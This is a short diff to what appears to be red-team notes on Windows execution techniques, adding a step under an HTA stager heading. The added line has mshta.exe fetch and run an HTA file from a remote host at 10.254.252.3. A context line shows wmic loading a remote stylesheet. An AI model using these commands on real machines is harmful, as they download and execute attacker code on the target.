@@ -50,7 +50,11 @@ wmic os get /format:"update.xsl"
 
 #### *Payload:* Create HTA Stager
 
-#### *Execution Technique:* Executing Stager with mshta.exe
+#### *Execution Technique:* 
+```markdown
+# Executing Stager with mshta.exe
+mshta.exe http://10.254.252.3:8000/app.hta
+```
 
 ----
 ### Executing Techniques
